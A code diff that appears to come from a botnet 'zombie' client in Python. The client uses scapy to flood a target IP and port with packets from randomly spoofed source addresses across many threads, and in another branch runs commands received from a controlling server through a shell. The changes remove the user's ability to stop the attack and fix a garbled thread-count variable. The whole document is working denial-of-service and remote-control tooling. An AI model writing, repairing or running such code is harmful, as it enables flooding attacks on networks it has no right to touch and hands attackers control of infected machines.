@@ -4,7 +4,7 @@ import platform
 import subprocess
 import random
 import time
-from scapy.layers.inet import TCP, UDP, ICMP, IP
+from scapy.layers.inet import TCP, ICMP, IP
 from scapy.sendrecv import send
 from scapy.all import *
 import os
@@ -22,7 +22,6 @@ def get_zombie_details() :
 
 def generate_random_ip():
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
-
 
 def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip=""):
     try:
@@ -105,7 +104,7 @@ if server_ready == "ready":
             sent_packets = 0
 
             def send_packets():
-                while not stop_threads:
+                while True:
                     if sent_packets >= number_of_packets:
                         break
                     if time.time() - start_time >= attack_duration:
@@ -117,7 +116,7 @@ if server_ready == "ready":
 
             threads = []
             try:
-                for _ in range(atnumber_of_threadstack_rate):
+                for _ in range(number_of_threads):
                     thread = threading.Thread(target=send_packets)
                     thread.start()
                     threads.append(thread)
@@ -126,14 +125,8 @@ if server_ready == "ready":
                     thread.join()
             except Exception as e:
                 print(f"Error during attack: {e}")
-            except KeyboardInterrupt:
-                print("\nAttack stopped by user.")
-                stop_threads = True
-                for thread in threads:
-                    thread.join()
             finally:
                 print("\nAttack completed.")
-
         else:
             output, error = subprocess.Popen(command_to_execute, 
                                             shell=True, 
